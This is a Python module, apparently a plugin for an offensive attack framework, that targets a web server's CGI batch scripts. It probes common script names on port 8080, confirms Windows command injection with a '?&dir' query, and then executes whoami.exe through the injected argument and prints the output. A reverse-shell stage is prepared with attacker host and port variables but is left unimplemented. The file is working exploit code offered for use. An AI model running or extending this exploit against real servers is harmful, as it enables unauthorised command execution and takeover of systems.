def run(data, cred, args):
    import requests
    import urllib.parse
    from pathlib import Path
    from core.target import get_current_url
    from core.attacker import resolve_lhost

    target = get_current_url(data)
    lhost = resolve_lhost(args)
    lport = getattr(args, "lport", 4444)

    if not target:
        print("[!] No target")
        return data

    if not target.startswith("http"):
        target = f"http://{target}:8080"

    base = target.rstrip("/")

    print(f"[*] Target: {base}")

    # ---------------- FIND CGI ----------------
    words = ["welcome", "test", "admin", "cgi"]

    found = None
    for w in words:
        url = f"{base}/cgi/{w}.bat"
        r = requests.get(url)
        if r.status_code == 200:
            found = url
            print(f"[+] Found CGI: {url}")
            break

    if not found:
        print("[!] No CGI script found")
        return data

    # ---------------- CHECK VULN ----------------
    test = requests.get(found + "?&dir")
    if "Volume" not in test.text:
        print("[!] Not vulnerable")
        return data

    print("[+] Command injection confirmed")

    # ---------------- BUILD PAYLOAD ----------------
    test_cmd = r"c:\windows\system32\whoami.exe"
    encoded = urllib.parse.quote(test_cmd)

    print("[*] Testing execution...")
    r = requests.get(f"{found}?&{encoded}")
    print(r.text)

    # ---------------- REVERSE SHELL ----------------
    print("[!] Reverse shell not implemented")


    return data
